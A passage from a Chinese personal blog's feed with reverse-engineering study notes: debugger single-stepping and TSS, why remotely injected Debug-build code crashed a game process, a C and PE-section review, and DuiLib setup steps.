开始CPU的单步执行,产生调试异常(int 1),中断到调试器</li><li>处理单步执行异常程序,TF置为0 </li></ol></li><li><p>执行源码调试,通过多次汇编一级的单步执行实现</p><p>通过符号文件判断是否为当行源码,若是的话,立即设置单步执行标志位继续执行,.直到ip不为当行源码.</p></li></ul><ul><li><p>程序分支</p><p>DbgCtl MSR寄存器的BTF标志,再设置TF.则可以执行到下一个分支指令触发调试异常</p></li></ul><ul><li><p>当指定任务被调度执行到中断调试器时. IA32CPU切换到一个新的任务时,检查存在于GDT中的TSS描述符的T标志位,若为1,啧产生调试异常</p><p>  TSS任务状态段</p><p>  <img src="https://i.loli.net/2019/04/11/5caf398fae53c.png" alt="TSS"></p><p>  切换进程更新动态字段:</p><ol><li>通用寄存器字段—任务切换之前，EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI寄存器状态。 </li><li>段选择符字段—任务切换之前，ES,CS,SS,DS,FS,GS寄存器保存的段选择符。 </li><li>EFLAGS寄存器字段—任务切换之前，EFAGS寄存器的状态。</li><li>EIP字段—任务切换之前，EIP寄存器的状态。</li><li>先前任务链接字段—包含先前任务的TSS的段选择符。该字段禁止任务通过使用IRET指令返回先前的任务。 </li></ol></li></ul><p>​     </p><p>​     </p><pre><code>等读完张银奎老师的软件调试再来做细致修改和改正    </code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="逆向基础" scheme="http://blog.dgmddw.xyz/categories/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="断点" scheme="http://blog.dgmddw.xyz/tags/%E6%96%AD%E7%82%B9/"/>
    
      <category term="调试" scheme="http://blog.dgmddw.xyz/tags/%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>VC：执行远程线程注入的代码段导致目标进程崩溃</title>
    <link href="http://blog.dgmddw.xyz/2019/04/01/2019-04-01-VC%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%A4%B1%E8%B4%A5/"/>
    <id>http://blog.dgmddw.xyz/2019/04/01/2019-04-01-VC线程注入失败/</id>
    <published>2019-03-31T16:00:00.000Z</published>
    <updated>2019-11-08T15:50:43.123Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天使用植物大战僵尸练习线程注入调用call的时候,一直处于崩溃状态,,后来查阅了教程博客,下面有人指出了问题所在 在此引用下老哥的博客文章.</p><p><a href="https://blog.csdn.net/kk20078733/article/details/5530884" target="_blank" rel="noopener">原文地址</a></p><blockquote><p>以前也曾多次提到远程线程注入导致进程崩溃的现象。</p><p>此次崩溃不同于前几次。</p><p>之前，采用的是dll注入的方式，注入后，由于同一个dll文件在不同的进程中映射的基地址不同，导致远程线程函数的入口地址不同，以至崩溃，这种情况，多数是本进程采用静态链接加载待远程注入的dll文件，而其他进程则动态加载该dll文件，两次加载将在内存中产生两个dll实例。</p><p>此次，需要向远程进程注入代码段，远程线程函数入口地址正确。测试时，为了方便，特地增加了一个消息框MessageBox，远程线程函数仅仅调用这个弹出消息框的函数，然后退出。结果，消息框正常弹出，但是，当点击确定退出消息框后，目标进程立即崩溃。原因不明。</p><p>200807210756注：</p><p>实在不知道问题出哪儿了，于是就想看看注入的VC代码对应的反汇编代码，这时，忽然想到一点，即：我都是在Debug模式下执行的，这可能会有问题。</p><p>进一步思考。Debug版本和Release版本最大的不同在于，每次调用一个函数后，Debug版本会进行堆栈检测。而目标进程显然是处于release模式，此时，如果注入的是Debug版本的代码，那么，调用函数之后，会有一句检测堆栈的机器指令，这很可能就是进程崩溃的原因所在。</p><p>于是，改为release环境测试，一切正常！OK！</p><p>(我用控制台程序实现时没有问题，用MFC程序实现就有问题，因此发现以上内容，将Debug版改为Release版就没问题了)</p><p>另附上远程注入的主要代码段，供参考，有问题望指教！！！</p><p>作者：kk20078733<br>来源：CSDN<br>原文：<a href="https://blog.csdn.net/kk20078733/article/details/5530884" target="_blank" rel="noopener">https://blog.csdn.net/kk20078733/article/details/5530884</a> </p></blockquote><p>Debug版会使用一个检查堆栈平衡的函数_checkesp..</p><p>详细的在小黄书中有讲到.现在记得不是很清楚.</p><p>有机会的话会写上来.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="错误整理" scheme="http://blog.dgmddw.xyz/categories/%E9%94%99%E8%AF%AF%E6%95%B4%E7%90%86/"/>
    
    
      <category term="植物大战僵尸" scheme="http://blog.dgmddw.xyz/tags/%E6%A4%8D%E7%89%A9%E5%A4%A7%E6%88%98%E5%83%B5%E5%B0%B8/"/>
    
  </entry>
  
  <entry>
    <title>语言复习       查漏补缺 不定时更新</title>
    <link href="http://blog.dgmddw.xyz/2019/03/15/2019-03-13-%E8%AF%AD%E8%A8%80%E8%A6%81%E7%82%B9%E5%A4%8D%E4%B9%A0/"/>
    <id>http://blog.dgmddw.xyz/2019/03/15/2019-03-13-语言要点复习/</id>
    <published>2019-03-14T16:00:00.000Z</published>
    <updated>2019-04-07T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="语言要点复习"><a href="#语言要点复习" class="headerlink" title="语言要点复习"></a>语言要点复习</h1><h3 id="内存区域"><a href="#内存区域" class="headerlink" title="内存区域"></a>内存区域</h3><h4 id="bss段"><a href="#bss段" class="headerlink" title=".bss段"></a>.bss段</h4><p> (block started by symbol segmengt) 符号段块的起始位置</p><p>只存在于运行在内存中的可执行文件中.保存程序的起始地址和结束地址.不存在于硬盘的二进制文件中</p><p>因为一般用来存放未初始化的全局变量和静态变量,在程序之行开始时,这段区域的未初始化的都会被初始化为0,</p><p>以便内存区能在运行时分配并被有效地清零.不同架构可能有不同的方法.</p><p>.bss段从可执行文件中得到,链接器得到这个段大小的内存块,紧跟在数据段之后.</p><h4 id="data-段"><a href="#data-段" class="headerlink" title=".data 段"></a>.data 段</h4><p>data segment数据段,存放初始化好的全局变量,静态变量.</p><p>这个位置通常属于只读的.静态常量区.</p><p><code>char *a = &quot;Windows&quot;</code>,这个Windows字符串属于.data段,只读属性.如果运行<code>*a = &#39;a&#39;</code>会造成访问冲突.</p><p>大小在编译链接时自动分配.和全局变量,静态变量,常量有关</p><h3 id="rdata段"><a href="#rdata段" class="headerlink" title=".rdata段"></a>.rdata段</h3><p>包含导入和导出的导出函数信息,还可以存储程序御用的其他只读数据.</p><p>有些文件会包含.idata和.edata用来存储导入导出信息.</p><h3 id="pdata-段"><a href="#pdata-段" class="headerlink" title=".pdata 段"></a>.pdata 段</h3><p>只存在于64位pe文件中,存储异常信息</p><p>.bss+.data=静态存储区.存放静态变量 全局变量 常量(常变量,字符串常量)已经初始化,不可被修改</p><p>局部变量通过指针,引用访问和修改.</p><p>全局变量在静态存储区不可以被间接修改.</p><h4 id="text-段-code段"><a href="#text-段-code段" class="headerlink" title=".text 段 .code段"></a>.text 段 .code段</h4><p>VS中叫.text</p><p>borland的delphi使用.code</p><p>程序代码段, 存放二进制代码,编译后是静态不可变的.</p><p>为什么要设置这个段呢.程序语言文本是只读的,数据不是.每次加载代码,会固定加载到内存中.减少内存的使用,增加的内存的复用.</p><h4 id="stack-栈"><a href="#stack-栈" class="headerlink" title="stack 栈"></a>stack 栈</h4><p>堆栈,存放局部变量的区域,使用<code>push</code>指令压栈.调用函数执行<code>call</code>前,参数压栈,函数返回结果也会压栈放回.</p><p>VS默认栈为1M,64bits的linux栈默认10mb.</p><h4 id="heap-堆"><a href="#heap-堆" class="headerlink" title="heap 堆"></a>heap 堆</h4><p>FIFO的数据结构.用来保障函数内存分布.</p><p>malloc new 申请</p><p>free delete 删除对重指定信息</p><p>malloc 放回void* ,new返回类型指针,并执行构造函数</p><h3 id="rsrc"><a href="#rsrc" class="headerlink" title=".rsrc"></a>.rsrc</h3><p>包含可执行文件所使用的资源.图标\图片\菜单项\字符串</p><p>在.rsrc中经常存储的字符串,是为了提供多语种的支持.</p><h3 id="reloc"><a href="#reloc" class="headerlink" title=".reloc"></a>.reloc</h3><p>包含重定位库文件的信息</p><h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><p>存储在静态存储区,在整个程序运行期间一直占据这些空间. 内存地址是不变的.不过不能在作用域外使用.</p><p>所有全局变量都是静态变量,而局部变量只有定义时加上static修饰符,才能成为局部静态变量.</p><p>不会随着函数的启动和结束而消失.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strA</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> str[] = <span class="string">"hello"</span>;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strA</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str* = <span class="string">"hello"</span>;<span class="comment">//字符串位于常量区,处于静态存储区.生命周期内恒定不变的.无法被改变</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h4><p><code>int c[2][3]</code> 表示数组c有两组3个数字的数组.</p><p><code>c</code>表示数组首地址 表示的是二维数组行指针</p><p><code>*c</code>第一行元素的首地址,是一维指针,是二维数组的列指针.</p><p><code>**c</code>取第一个元素的值.</p><p><code>char (*str)[20]</code>数组指针.执行数组元素的指针</p><p><code>char *str[20]</code>指针数组,数组成员为<code>char *</code>指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> *p=arr;<span class="comment">//首个元素的首地址</span></span><br><span class="line">    </span><br><span class="line">    *(p++)+=<span class="number">123</span>;<span class="comment">//计算完成后 指向第二个元素</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d,%d\n"</span>, *p,*(++p)); <span class="comment">//参数从左往右看,此时p指向第三个元素</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是没有返回值,没有参数的函数</p><p><code>void f(void)</code></p><p>这是一个指向函数的指针,该函数没有返回值和参数</p><p><code>void(*p)(void)</code></p><p>上述指针的类型</p><p><code>void (*)(void)</code></p><p>对该类型的强制转换</p><p><code>(void (*)(void))</code></p><p>对该类型的强制转换</p><p><code>(void (*)(void))0</code></p><h4 id="让程序跳转到绝对地址是0x100000去执行"><a href="#让程序跳转到绝对地址是0x100000去执行" class="headerlink" title="让程序跳转到绝对地址是0x100000去执行"></a>让程序跳转到绝对地址是0x100000去执行</h4><p><code>((void (*)())0x100000)()</code></p><h3 id="const-static"><a href="#const-static" class="headerlink" title="const static"></a>const static</h3><h4 id="先说const"><a href="#先说const" class="headerlink" title="先说const"></a>先说const</h4><p>const 是表示常量的标识符.</p><p>const char * A  A指针指向的变量是不可变的</p><p>char const *A    和上述一样</p><p>char *const A    指针本身是不可变的,所以必须被初始化.而变量可以改变</p><h4 id="static-标识符"><a href="#static-标识符" class="headerlink" title="static 标识符"></a>static 标识符</h4><ul><li><p>如果在全局变量加上static,被限定了作用域,只能在该源文件中使用.从而保证了在其他源文件中不被使用.只被初始化一次.</p><p>改变了作用域和使用范围</p></li><li><p>给局部变量加上的static的话,在局部函数结束后不会消失,且是最新的状态.</p><p>只被初始化一次</p><p>(编译器在该目标编译单元内只有该函数的入口地址,没有函数名,其他编译单元不能通过函数名调用该函数,)</p><p>随着程序结束而消失</p></li><li><p>static函数在内存中只存在一份,普通函数存在复数拷贝</p></li><li><p>类的成员函数中加上,该类的对象同时共用这一个成员函数,成员变量也是.</p></li></ul><h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><p>多态:<a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E5%9E%8B_(%E7%89%A9%E4%BB%B6%E5%B0%8E%E5%90%91%E7%A8%8B%E5%BC%8F%E8%A8%AD%E8%A8%88" target="_blank" rel="noopener">多态</a>)（Polymorphism）是指由继承而产生的相关的不同的类，其对象对同一消息会做出不同的响应<a href="https://zh.wikipedia.org/wiki/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1#cite_note-8" target="_blank" rel="noopener">[8]</a></p><p><a href="https://zh.wikipedia.org/wiki/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1</a></p><p>很有意思的讲解</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="逆向基础" scheme="http://blog.dgmddw.xyz/categories/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="复习" scheme="http://blog.dgmddw.xyz/tags/%E5%A4%8D%E4%B9%A0/"/>
    
      <category term="基础" scheme="http://blog.dgmddw.xyz/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>DuiLib环境搭建</title>
    <link href="http://blog.dgmddw.xyz/2018/11/05/2018-11-05-DuiLib%E6%90%AD%E5%BB%BA/"/>
    <id>http://blog.dgmddw.xyz/2018/11/05/2018-11-05-DuiLib搭建/</id>
    <published>2018-11-04T16:00:00.000Z</published>
    <updated>2019-11-08T15:49:32.522Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天弄了一天环境,终于编译成功了.如果这篇文章有幸被看到,希望能帮助你少走弯路.</p><ol><li>克隆DuiLib库<code>git clone https://github.com/duilib/duilib.git</code>,duilib中有个大写的DuiLib文件夹,这是我们需要编译的库.</li><li>在VS2015中,创建示例程序是从win32-&gt;win32项目创建的.</li><li>参考DuiLib的<a href="https://github.com/duilib/duilib/wiki/%E6%AD%A3%E7%A1%AE%E7%BC%96%E8%AF%91-Duilib-%E9%9D%99%E6%80%81%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">wiki</a>,比较重要的是lib的引用:附加依赖项,附加包含目录,附加库目录.</li><li>如果采用的是文件的xml格式的话,一定要将xml与exe同一父目录下,不然会出现编译成功,却DuiLib加载资源失败的提示哦.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="工具" scheme="http://blog.dgmddw.xyz/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="DuiLib" scheme="http://blog.dgmddw.xyz/tags/DuiLib/"/>
    
  </entry>
  
</feed>
